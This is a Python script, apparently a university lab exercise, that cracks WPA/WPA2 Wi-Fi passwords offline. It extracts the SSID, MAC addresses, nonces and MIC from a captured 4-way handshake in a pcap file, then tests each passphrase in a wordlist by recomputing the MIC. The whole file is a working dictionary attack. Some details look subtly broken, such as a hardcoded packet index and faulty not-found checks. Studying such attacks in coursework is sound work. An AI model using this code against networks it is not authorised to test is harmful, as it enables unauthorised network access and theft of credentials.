#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Scaircrack

Script to test multiple passwords from a file, creates a MIC with each password and compares it with the one retrieved in the last packet of the 4-way handshake.
"""

from numpy import array
from numpy import array_split
from pbkdf2 import *
from binascii import a2b_hex, b2a_hex
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
__author__ = "Abraham Rubinstein et Yann Lederrey"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"
__modified_by__ = "Valzino Benjamin, Tissot Olivier, Bailat Joachim"

import hmac
import hashlib


def get_passphrases(file):
    """
    This function returns a list of passphrases from a file
    """
    passphrases = []
    with open(file) as f:
        passphrases = f.readlines()
    passphrases = [x.strip() for x in passphrases]
    return passphrases


def collect_infos_from_pcap(pcapfile, constructor_mac_prefix=""):
    """
    This function parses a pcap file and returns the following parameters:
    - APmac
    - Clientmac
    - APnonce
    - Clientnonce
    - MIC
    - data
    """
    wpa = rdpcap(pcapfile)

    # identify where is the first packet of the 4-way handshake
    # identify where are the first packet of the 4-way handshake
    for i in range(0, len(wpa)):
        if wpa[i].type == 2 and wpa[i].subtype == 8:
            try:
                if wpa[i][EAPOL].type == 3:

                    if (constructor_mac_prefix == ""):
                        break

                    #check MAC of the AP to keep only the 4-way handshake related to the constructor selected
                    if (str(wpa[i].addr1).startswith(constructor_mac_prefix)):
                        print(i)
                        break
                        
            except:
                pass

    if (i == len(wpa)):
        print("No 4-way handshake found in the pcap file")
        exit()

    # sync indexes to the first packet of the 4-way handshake
    i = i - 1

    print(wpa[i].summary())
    # retrieve APmac and clientmac from the first packet of the 4-way handshake
    APmac = a2b_hex(wpa[i].addr2.replace(":", ""))
    Clientmac = a2b_hex(wpa[i].addr1.replace(":", ""))

    # retrieve ssid from the beacon frame
    #iterate over all packets before the 4-way handshake
    for j in range(0, i):
        #check if the packet is a beacon frame
        if wpa[j].type == 0 and wpa[j].subtype == 8:
            #check if the beacon frame is from the same AP as the 4-way handshake
            if str(wpa[j].addr2).replace(":", "") == APmac.hex():
                ssid = wpa[j].info.decode()
                ssid = str.encode(ssid)
                break
    
    if (j == i):
        print("No beacon frame found in the pcap file")
        exit()


    # retrieve ANonce from first packet of the 4-way handshake
    ANonce = a2b_hex(wpa[i][EAPOL].load[13:45].hex())

    # retrieve SNonce from second packet of the 4-way handshake
    SNonce = a2b_hex(wpa[i+1][EAPOL].load[13:45].hex())

    # retrieve MIC and data from the fourth packet of the 4-way handshake
    # mic =  wpa[i+4].original[-18:-2].hex()
    mic = wpa[i+3].original[-18:-2].hex()
    data = wpa[i+3].original[48:-18] + b'\0' * 16 + wpa[8].original[-2:]

    print("We found all required parameters for the attack in the pcap !")

    return ssid, APmac, Clientmac, ANonce, SNonce, mic, data


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen*8+159)/160):
        hmacsha1 = hmac.new(key, A+str.encode(chr(0x00)) +
                            B+str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R+hmacsha1.digest()
    return R[:blen]


def main():
    # retrieve infos from 4way handshake
    ssid, APmac, Clientmac, ANonce, SNonce, mic, data = collect_infos_from_pcap(
        "./wpa_handshake.cap")
    
    print("Starting attack...")
    # iterate over all passphrases in the wordlist
    for passphrase in get_passphrases("wordlist.txt"):
        A = "Pairwise key expansion"
        B = min(APmac, Clientmac)+max(APmac, Clientmac) + \
            min(ANonce, SNonce)+max(ANonce, SNonce)
        passphrase = str.encode(passphrase.replace(" ", "").replace("\n", ""))
        pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)
        ptk = customPRF512(pmk, str.encode(A), B)
        mic_passphrase = hmac.new(
            ptk[0:16], data, hashlib.sha1).hexdigest()[:32]

        if (mic_passphrase == mic):
            print("Password found : ", passphrase.decode())
            exit(0)


    print("Password not found !")
    print("Maybe try another wordlist ?")

if __name__ == "__main__":
    main()
